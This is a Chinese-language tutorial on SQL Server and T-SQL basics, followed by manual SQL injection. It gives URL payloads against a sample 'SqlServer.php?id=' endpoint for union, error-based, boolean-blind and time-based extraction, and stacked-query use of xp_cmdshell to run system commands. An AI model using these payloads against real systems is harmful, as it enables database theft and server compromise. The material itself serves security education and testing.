---
title: MSSQL下的SQL注入
date: 2026-11-10
---

# MSSQL下的SQL注入

## SQL Server 基础

Microsoft SQL Server 也叫 MSSQL，它是一个数据库平台，提供数据库的从服务器到终端的完整解决方案，其中数据库服务器部分是一个数据库管理系统，用于建立、使用和维护数据库，属于关系型数据库，默认端口号为 1433。

### 默认数据库

SQL Server 有 6 个默认数据库，是用于维护系统正常运行的**系统数据库**，其中包括四个系统数据库：master、model、msdb、tempdb，和两个实例数据库：ReportServer、ReportServerTempDB。

系统数据库：

- **master**：记录了 SQL Server 实例的所有系统级消息，包括实例范围的元数据（如登录账号、断点、链接服务器和系统配置设置）
- msdb：供 SQL Server 代理服务调度报警和作业记录操作员的使用，保存关于调度报警、作业、操作员等信息
- model：SQL Server 实例上创建的所有数据库的模板
- tempdb：临时数据库，用于保存临时对象或中间结果集，为数据库的排列等操作提供了一个临时的工作空间

实例数据库：

- ReportServer：存储 SSRS 配置部分，报告定义，报告元数据，报告历史，缓存政策，快照，资源，安全设置，加密数据，调度和提交数据，以及扩展信息
- ReportServerTempDB：存储中间处理产品，例如缓冲的报告、会话和执行数据等

### 数据库的组成

在 SQL Server 中，数据库是以文件的形式存在的，由文件和文件组组成。

#### 文件

数据库中的文件基本是分为以下三类：

- 主要数据文件：存放数据和数据库的初始化信息。每个数据库有且只能有一个主要数据文件，以`.mdf`结尾
- 次要数据文件：存放除了主要数据文件以外的所有数据文件。次要数据文件不是必须的，可以没有，也可以有多个，以`.ndf`结尾
- 事务日志文件：存放用户回复数据库的所有文件信息。每个数据库至少有一个日志文件，也可以有多个，以`.ldf`结尾

#### 文件组

文件组是数据库文件一种逻辑管理单位，他将数据库文件分成不同的文件组，方便对文件的分配和管理，分为两种类型：

- 主文件组`Primary`：主要是数据文件和没有明确指派给其他文件组的文件
- 用户自定义的文件组：`Create DataBase`或者`Alter DataBase`语句，`FileGroup`关键字指定的文件组

#### 设计原则

SQL Server 数据库的设计原则如下：

- 文件只能是一个文件组的成员
- 文件或文件组不能由多个数据库使用
- 日志不能作为文件组的一部分

### SQL Server 权限

SQL Server 中的权限控制被分成服务器和数据库两个级别，一个服务器可以包含多个数据库。服务器级别权限可以让我们控制登录、服务器资源操作等等；数据库级别的权限可以让我们对具体的表、视图、数据等数据库内资源进行操作。

在 SQL Server 的 SQL 注入中，我们关注的是 SQL Server 服务器级别的权限，可以把权限简单归为三类：

- **sa 权限**：即服务器角色`sysadmin`，拥有数据库操作、文件管理、命令执行、注册表读取等权限，是 SQL Server 数据库的最高权限。
- **db 权限**：文件管理、数据库操作等权限，`users-administrators`。
- **public 权限：**数据库操作，`guest-users。`

如果我们找到一个 SQL Server 数据库的注入点，可以通过命令判断当前用户的权限，查询语句返回 1，说明是对应的权限：

```sql
-- 判断是否是SA权限
select is_srvrolemember('sysadmin')
-- 判断是否是db_owner权限
select is_member('db_owner')
-- 判断是否是public权限
select is_srvrolemember('public')
```

## T-SQL

在 MySQL 数据库中使用 SQL 语言对数据库进行操作，而在 SQL Server 数据库中使用的是 Transaction-SQL 语言，简称 T-SQL，这是在 SQL 基础上的一种数据库编程语言。

### 创建数据库

用 T-SQL 创建名为 SQLDB 的数据库：

```sql
CREATE DATABASE SQLDB;
```

如果要对数据库的文件路径、大小、增长方式等进行配置，可以进行配置：

```sql
CREATE DATABASE SQLDB
ON PRIMARY (
    NAME = SQLDB_data,
    FILENAME = 'C:\MSSQL\DATA\SQLDB_data.mdf',
    SIZE = 10MB,
    MAXSIZE = 100MB,
    FILEGROWTH = 5MB
)
LOG ON (
    NAME = SQLDB_log,
    FILENAME = 'C:\MSSQL\DATA\SQLDB_log.ldf',
    SIZE = 5MB,
    MAXSIZE = 50MB,
    FILEGROWTH = 5MB
);
```

### 创建表

用 T-SQL 在 SQLDB 中新建表，新建表的时候要同时指明字段信息：

```sql
-- 切换到 SQLDB 数据库
USE SQLDB;
GO

-- 创建一个名为 Employees 的表
CREATE TABLE Employees (
    EmployeeID INT PRIMARY KEY IDENTITY(1,1),  -- 员工ID，主键，自增
    FirstName NVARCHAR(50) NOT NULL,           -- 名，最大50字符，不能为空
    LastName NVARCHAR(50) NOT NULL,            -- 姓，最大50字符，不能为空
    BirthDate DATE NULL,                       -- 出生日期，可以为空
    HireDate DATE NOT NULL,                    -- 入职日期，不能为空
    Email NVARCHAR(100) UNIQUE,                -- 邮箱，唯一约束，可为空
    Salary DECIMAL(10, 2) CHECK (Salary >= 0)  -- 工资，保留两位小数，必须为非负数
);
```

### 增删改查

**插入数据**

使用`insert`向该表中插入数据：

```sql
-- 切换到 SQLDB 数据库
USE SQLDB;
GO

-- 向 Employees 表插入一条记录（不包括自增主键 EmployeeID）
INSERT INTO Employees (FirstName, LastName, BirthDate, HireDate, Email, Salary)
VALUES (
    'John',                -- FirstName
    'Doe',                 -- LastName
    '1985-06-15',          -- BirthDate
    '2020-01-10',          -- HireDate
    'john.doe@example.com',-- Email
    5500.00                -- Salary
);

```

**删除数据**

使用`delete`删除名为 John Doe 的员工：

```sql
-- 删除名为 John Doe 的员工
DELETE FROM Employees
WHERE FirstName = 'John' AND LastName = 'Doe';
```

**修改数据**

修改名为 Sean Doe 的员工的薪资，修改为 6000.00：

```sql
-- 修改名为 Sean Doe 的员工薪资为 6000.00
UPDATE Employees
SET Salary = 6000.00
WHERE FirstName = 'Sean' AND LastName = 'Doe';
```

**查询数据**

查询数据的语句基本结构如下：

```sql
SELECT <列名1>, <列名2>, ...
FROM <表名>
[WHERE <筛选条件>]
[GROUP BY <分组列>]
[HAVING <分组后的筛选条件>]
[ORDER BY <排序列> [ASC|DESC]];
```

比如使用 T-SQL 语句来查询名为 Sean Doe 的员工的邮箱和薪资信息：

```sql
SELECT Email, Salary
FROM Employees
WHERE FirstName = 'Sean' AND LastName = 'Doe';
```

## SQL Server 手工注入

MSSQL 注入是最为复杂的数据库攻击技术，由于该数据库的功能非常强大，存储过程以及函数语句非常丰富，这些灵活的语句造就了新颖的攻击思路。

对于 MSSQL 注入点，我们一般最关心这个注入点的权限问题。MSSQL 有三个权限：

1. sa（最高权限 System）
2. db（文件管理、数据库操作等 user-administrator）
3. public（数据库操作权限 guest-users）

常见的搭配是：asp/aspx + SQL Server。

### 常见注入函数与关键字

```sql
-- TOP 对标与MySQL中的limit，想要输出一条信息 TOP 1 ，输出两条 TOP 2
SELECT TOP 2 StudentName FROM STUDENTS
-- @@version 获取版本信息
SELECT @@version
-- db_name 获取数据库的名字
SELECT db_name()
-- OBEJCT_ID 获取表对象ID
OBJECT_ID('表名')
-- col_name table_id表对象ID column_id 列的序号 
COL_NAME ( table_id , column_id )
-- convert 把日期转换成新数据类型的通用函数
CONVERT(data_type(length),data_to_be_converted,style)
-- stuff 删除字符串中的一部分内容，用另一个字符串替代
stuff( character_expression , start , length , replaceWith_expression )
-- len 返回目标字符串的长度
len(select db_name())
-- SUBSTRING 用于从字符串中提取指定位置的一部分
SUBSTRING(expression, start, length)
```

### 注入手法

注入手法总体上和 MySQL 差不多，差别在于一些函数的区别。

#### 联合查询

在 MSSQL 数据库中会存在一个系统自带库—— master，每个库都存在一个系统自带表—— sysobjects。该系统表中对我们来说有三个字段有用：

- NAME：表名信息
- XTYPE：代表**表的类型**。其中 S 代表系统自带表，U 代表用户创建表
- ID：用于连接 syscolumns 表

首先判断目标数据库是否是 MSSQL：

```sql
SqlServer.php?id=101 and exists(select * from sysobjects) --+
```

如果正常返回说明网站使用的是 MSSQL。

然后是判断字段长度，也是使用`order by`语句：

```sql
SqlServer.php?id=101 order by 4 -- 正常
SqlServer.php?id=101 order by 5 -- 报错
```

然后查询当前数据库的版本信息和名字：

```sql
SqlServer.php?id=0 union select 1,db_name(),3,@@version -- q
```

但是需要注意的是，当联合查询注入的数据和前半部分的数据类型不匹配的时候会出现报错。

接下来查询表名，将获取到的数据库名和`.dbo.sysobjects`进行拼接，通过限制`xtype`为`u`，使用 TOP 1 进行限制，找到第一条查询到的用户创建表：

```sql
SqlServer.php?id=0 union select 1,2,3,(select top 1 name from SchoolDB.dbo.sysobjects where xtype='u') -- q
```

查询第二个表名数据时可以使用`and name != '第一次输出中的表名'`的方式：

```sql
SqlServer.php?id=0 union select 1,2,3,(select top 1 name from SchoolDB.dbo.sysobjects where xtype='u' and name != 'STUDENTS') -- q
```

获取列名，通过`col_name`、`object_id`等函数，遍历获取列名：

```sql
SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id('STUDENTS'),1) from sysobjects)--+
SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id('STUDENTS'),2) from sysobjects)--+
SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id('STUDENTS'),3) from sysobjects)--+
```

然后获取数据：

```sql
SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS)--+
SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS WHERE StudentID != 101)--+
SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS WHERE StudentID != 101 and StudentID != 102)--+
```

#### 报错注入

MSSQL 数据库是强类型语言数据库，当类型不一样时会报错，配合子查询即可实现报错注入。具体可以利用的函数有：

```sql
convert()   -- 将一种数据类型的表达式转换成另一种
file_name() 
db_name() 
col_name() 
filegroup_name()
object_name() 
schema_name() 
type_name() 
cast()
```

以`convert()`为例，`convert()`语法如下：

```sql
CONVERT(data_type(length),data_to_be_converted,style)
-- 注释 ：
-- data_type(length) 转换为⽬标数据类型（带有可选的长度）
-- data_to_be_converted 含有需要转换的值
-- style 规定⽇期/时间的输出格式（可省略）
```

对于`convert(int,@@version)`，`convert()`函数会首先执行第二个参数指定的 SQL 查询，然后尝试将查询结果转换为`int`类型。但是由于查询语句的结果是`varchar`类型，因此`convert()`函数会爆出一个 SQL Server 的错误信息，格式是"SQL查询结果"无法转换为“int”类型，这样就可以利用报错来获取 SQL 的查询结果了。

```sql
SqlServer.php?id=101 and 1=convert(int,db_name())
```

除了使用函数以外，在两个不同类型的数据进行比较时，也会爆出 SQL Server 的错误信息，这也是一种利用方法：

```sql
SqlServer.php?id=101 and 1=(select db_name())
```

我们可以通过`for xml path`，查询所有数据库的名字，`FOR XML PATH('')`表示输出为 XML，但不加任何标签。通常可以配合`stuff()`使用，用来拼接多个值并去除第一个多余分隔符：

```sql
SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(name) from sys.databases for xml path('')),1,0,''))--
```

这样会爆出所有表名，但是其中存在一些系统表，可以通过`xtype='U'`来过滤出用户表：

```sql
SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(name) from sysobjects WHERE xtype = 'U' for xml path('')),1,0,'')) --+
```

然后就是爆出 Students 表的所有字段。

```sql
SqlServer.php?id=101 and  1=convert(int,stuff((select quotename(name) from SchoolDB.sys.columns where object_id=object_id('Students') for xml path('')),1,0,'')) -- q
```

最后爆数据：

```sql
SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(StudentID) from Students for xml path('')),1,0,''))-- q
```

#### 布尔盲注

首先判断是否存在盲注：

```sql
-- 正常回显
SqlServer.php?id=101 and 1=1--+
-- 不正常回显
SqlServer.php?id=101 and 1=2--+
```

首先猜数据库名的长度，正常回显时，说明判断正确：

```sql
-- 回显正常
SqlServer.php?id=101 and len((select db_name()))=8--+
-- 不正常回显
SqlServer.php?id=101 and len((select db_name()))=4--+
```

猜数据库名字：

```sql
-- 获取数据库名的第一个字符ascii码为83
SqlServer.php?id=101 and ascii(substring((select db_name()),1,1))=83 -- 
-- 获取数据库名的第一个字符ascii码为99
SqlServer.php?id=101 and ascii(substring((select db_name()),1,1))=99 --
```

爆表名、列名和数据只要替换 SQL 语句即可。

#### 延时注入

这里主要使用的是`WAITFOR DELAY '0:0:n'`这个语句，表示要延迟几秒，作用就是等待待定时间，然后再执行后续语句。如果该语句注入成功，会造成数据库返回记录和 Web 请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有延迟，渗透测试⼈员就可以判断网站是否存在注⼊漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测⽅法。

利用这个注入语句，利用判断是否存在延时注入：

```sql
SqlServer.php?id=101 WAITFOR DELAY '0:0:5' -- q
```

后续的利用和布尔注入类型，判断数据库名长度：

```sql
SqlServer.php?id=101 if (len((select db_name()))=8) WAITFOR DELAY '0:0:5' -- q
```

然后一个字符一个字符进行猜解数据库名：

```sql
SqlServer.php?id=101 if (ascii(substring((select db_name()),1,1))=83) WAITFOR DELAY '0:0:5'-- q
```

后续只要替换 SQL 语句就可以注入其他数据。

## SQL Server 命令执行

MSSQL 数据库中，存在`xp_cmdshell()`函数：SQL 中运行系统命令行的系统存储过程，运行 SQL Server 以服务账户的身份执行 Windows 命令或外部程序。如果该命令开启，我们就可以执行系统命令。

如果我们判断网站权限是`sa`权限，想要执行系统命令，就要先判断`xp_cmdshell`是否存在，当页面正常返回时，说明该命令是开启的：

```sql
SqlServer.php?id=101 and 1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')
```

`xp_cmdshell`默认在 MSSQL 2000 中是开启的，在 MSSQL 2005 后版本默认禁止。2005 的`xp_cmdshell`的权限一般是`system`，而 2008 多数为`nt authority\network service`。

但是如果有管理员`sa`权限，则可以用`sp_configure`重新开启：

```sql
-- 开启 xp_cmdshell：
exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell',1;reconfigure;
-- 关闭 xp_cmdshell：
exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell', 0;reconfigure
```

可以使用堆叠注入的方式进行命令执行，但是有些命令的执行需要较高权限。

```sql
SqlServer.php?id=101 ;exec master..xp_cmdshell "命令"
```





















































